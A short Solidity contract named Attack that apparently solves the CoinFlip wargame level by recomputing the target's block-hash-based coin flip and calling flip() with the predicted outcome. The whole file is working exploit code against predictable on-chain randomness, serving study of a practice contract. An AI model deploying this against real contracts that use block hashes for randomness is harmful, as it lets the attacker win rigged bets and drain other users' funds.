// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {

    function flip(bool _guess) external returns (bool);

}
contract Attack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip game;

    constructor(address _coinFlipAddress) {
        game = ICoinFlip(_coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        game.flip(side);
        
    }
}  